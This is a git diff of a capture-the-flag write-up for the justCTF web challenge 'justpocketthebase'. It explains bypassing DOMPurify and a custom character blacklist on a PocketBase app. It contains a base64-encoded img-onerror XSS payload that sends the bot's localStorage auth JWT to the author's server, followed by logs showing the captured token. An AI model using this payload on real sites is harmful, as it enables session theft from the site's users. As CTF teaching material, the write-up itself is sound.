@@ -5,14 +5,21 @@
 The thing I love the most about ready-to-use backends and frameworks is that they are always secure :)
 
 -http://justpocketthebase.web.jctf.pro
--https://s3.cdn.justctf.team/c5536ebc-945a-4fa7-af34-f064b29916d0/justpocketthebase_docker.tar.gz
+```
+
+## Provided Files
+```
+- justpocketthebase_docker.tar.gz
 ```
 
 ## Writeup
 
+> [!NOTE]
+> Credit to [Profiluefter](https://github.com/profiluefter) and [lavish](https://github.com/lavish) who worked together with me on this challenge.
+
 Starting off by taking a look at the website before inspecting the provided code. <br/>
-After creating an account we are able to create plants which will be stored in the application and can be accessed via `view-plant?id=[ID]`. We can pass a title and an image to create such an object. <br/>
-Custom `character-blacklist`: <br/>
+After creating an account we are able to create plants with a custom `title` and a custom `image` we provide which will be stored in the application and can be accessed via `/view-plant?id=[ID]`. <br/>
+Custom character-blacklist:  <br/>
 ```js
 let blacklist = [
 	'window',
@@ -59,14 +66,23 @@ try {
 }
 ```
 
-The `dompurify` can be bypassed using [HTML-Entity-Characters](https://html.com/character-codes/) by simply "encoding" `<` and `>`. <br/>
+A reporting option on the website indicates a possible `XSS` vulnerabiltiy, so we analyzed the `sanitization-process` for the title element of a new post. <br/>
 
-XSS via title of a new plant by exchanging **()** with **``**: <br/>
+The `dompurify` can be bypassed using [HTML-Entity-Characters](https://html.com/character-codes/) by simply encoding `<` and `>`. <br/>
+After the dompurify our input will be decoded meaning the same approach wouldn't work to bypass the `custom-blacklist`. <br/>
+
+It's possible to execute XSS via the `title` of a new plant by exchanging **()** with **``**. <br/>
 ```js
 &lt;img src=1 onerror=alert`1`&gt;
+// &lt; == <
+// &gt; == >
 ```
+Although this confirmed our suspicion, it didn't help much because the `custom-blacklist` still blocked valuable characters which we need. <br/>  
 
-Using [PortSwigger-Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#img-tag-with-base64-encoding) we are able to simply execute javascript and bypass the `custom-blacklist`. <br/>
+After knowing that we are successfully able to execute a `Cross-Site-Scripting-Attack` via title we were now searching for a possible way to bypass the `custom-blacklist` which disallows important characters like `/`. <br/>
+To find a way around this issue we tried an approach using a `base64` encoded payload which can be decoded using the `builtin` javascript function `atob` (ASCII to Binary). <br/>
+This would bypass the `custom-blacklist` as our encoded payload doesn't contain the actual characters like `/` or `:`. <br/>
+Using [PortSwigger-Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#img-tag-with-base64-encoding) we found a way to execute our encoded payload. <br/>
 ```js
 &lt;img src=1 onerror=location=atob`amF2YXNjcmlwdDpmZXRjaChgaHR0cHM6Ly9hcnl0My5kZXYvJHtsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgicG9ja2V0YmFzZV9hdXRoIil9YCk=`&gt;
 ```
@@ -84,7 +100,7 @@ Leak localstorage which contains the JWT of the bot: <br/>
 ```js
 &lt;img src=1 onerror=location=atob`amF2YXNjcmlwdDpmZXRjaChgaHR0cHM6Ly9hcnl0My5kZXYvJHtsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgicG9ja2V0YmFzZV9hdXRoIil9YCk=`&gt;
 
-// fetch(`https://aryt3.dev/${localStorage.getItem("pocketbase_auth")}`) - my webserver
+// fetch(`https://aryt3.dev/${localStorage.getItem("pocketbase_auth")}`)
 ```
 
 Server Logs after reporting the webpage: <br/>
@@ -97,9 +113,9 @@ URL-Decoded:
 {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb2xsZWN0aW9uSWQiOiJfcGJfdXNlcnNfYXV0aF8iLCJleHAiOjE3MTk2NjI2OTcsImlkIjoiZWJtN3dvZnk5OW5tYjRiIiwidHlwZSI6ImF1dGhSZWNvcmQifQ.hSvcypOCNSsIYeXJ-JZE4H7vWnt7UFvrzAoMBkxwVp0","model":{"avatar":"","collectionId":"_pb_users_auth_","collectionName":"users","created":"2024-06-15 10:52:23.378Z","email":"","emailVisibility":false,"id":"ebm7wofy99nmb4b","name":"","updated":"2024-06-15 10:52:23.378Z","username":"flag","verified":false}}
 ```
 
-Having obtained the whole localstorage we can switch ours with the one we retrieved. <br/>
-After that we can access the post with the `flag-image` and download that image. <br/>
-Now we can inspect the image in the `admin-post` which reveals the flag. <br/>
+Having obtained the whole localstorage-item `pocketbase_auth`, we switched ours with this one. <br/>
+After that we were able to access the post with the `flag-image` and download the picture. <br/>
+Afterwards we inspected the image in the `admin-post` which revealed the flag and concludes this writeup. <br/>
 ```sh
 $ exiftool flag_gygEshYymV.png 
 ExifTool Version Number         : 12.76
